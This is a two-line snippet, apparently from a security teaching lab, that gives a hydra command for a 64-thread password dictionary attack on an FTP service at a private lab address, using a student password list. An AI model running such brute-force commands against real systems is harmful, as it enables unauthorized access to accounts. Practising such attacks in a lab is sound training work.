# Dictionary attack FTP at 192.168.193.14 using 64 threads
hydra -t64 -l ftp  -P ../StudentsMaterial/passwordslist ftp://192.168.193.14
